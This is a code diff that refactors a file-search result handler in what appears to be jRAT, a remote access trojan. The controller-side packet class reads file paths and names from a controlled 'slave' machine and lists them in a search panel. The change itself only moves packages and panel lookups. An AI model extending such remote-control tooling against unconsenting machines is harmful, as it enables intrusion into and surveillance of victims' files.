@@ -1,9 +1,10 @@
-package jrat.controller.packets.incoming;
+package jrat.module.fs.packets;
 
 import iconlib.FileIconUtils;
 import jrat.controller.Slave;
-import jrat.controller.ui.frames.FrameRemoteFiles;
-import jrat.controller.ui.panels.PanelSearchFiles;
+import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.module.fs.ui.FrameRemoteFiles;
+import jrat.module.fs.ui.PanelSearchFiles;
 
 import javax.swing.*;
 import java.io.DataInputStream;
@@ -16,12 +17,12 @@ public class Packet37SearchResult extends AbstractIncomingPacket {
 		String name = slave.readLine();
 		boolean dir = slave.readBoolean();
 
-		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
+		FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
+
 		if (frame != null) {
 			PanelSearchFiles panel = frame.getSearchPanel();
 			panel.getRenderer().icons.put(path, (ImageIcon) FileIconUtils.getIconFromExtension(name, dir));
 			panel.getModel().addRow(new Object[] { path, name });
 		}
 	}
-
 }
